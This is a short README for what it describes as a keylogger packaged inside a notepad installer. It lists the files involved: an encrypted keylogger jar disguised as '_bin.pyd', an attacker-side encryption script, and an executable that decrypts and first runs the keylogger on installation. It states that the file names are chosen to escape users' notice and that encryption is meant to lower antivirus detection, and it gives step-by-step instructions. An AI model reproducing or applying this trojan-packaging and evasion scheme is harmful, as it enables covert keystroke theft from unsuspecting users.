In the Encryption-Decryption folder, we have 5 files:
1. _bin.pyd
2. bin.jar
3. encrypt.py
4. binaries.py
5. binaries.zip

-----------------------------------------------------------------------------------------------------------------------------------

Following is the description of what each file's purpose:

1. _bin.pyd (encrypted keylogger jar)
_bin.pyd is the encrypted keylogger jar executable file (named as '_bin.pyd' to avoid naive user's attention).
This file is included in the installation file. As it is encrypted, the chances of this file being detected as malware are less.

2. bin.jar (decrypted keylogger jar)
bin.jar is the decrypted keylogger jar executable file (named as 'bin.jar' to avoid naive user's attention).
This file is not included in the installation file, instead encryption of this file ('_bin.pyd') is included.
Upon installation, the bin.jar is obtained by decryption of the _bin.pyd file.

3. encrypt.py (encryption logic)
encrypt.py is a python program to encrypt the keylogger jar file. (bin.jar --(encrypt)--> _bin.pyd)
This file is just used by attacker and is not included in the installation file.

4. binaries.py (decryption & first time execution logic)
binaries.py is the file that decrypts the encrypted keylogger jar executable file ('_bin.pyd') and executes the decrypted keylogger jar ('bin.jar')
upon installation of the notepad application. (Named as 'binaries.py' to avoid naive user's attention)
This file is included in the installation in an executable format (found in binaries.zip).

5. binaries.zip (executable decryption & first time execution logic)
binaries.zip contains the executable file (binaries.exe) and its support files.
The binaries.exe file is the executable file to execute the decryption logic and run the keylogger for the first time.

Instructions:

Encryption:
Requires Python 3.4+
1. Place the bin.jar (keylogger jar) and the encrypt.py (encryption logic) files in one folder.
2. Run the encrypt.py file using python i.e. 'python encrypt.py'
3. The encrypted file will be _bin.pyd

Decryption:
1. Place the _bin.pyd (encrypted keylogger jar) and the binaries.exe with its support files (decryption logic) in one folder.
2. Run the binaries.exe file
3. The decrypted file will be bin.jar
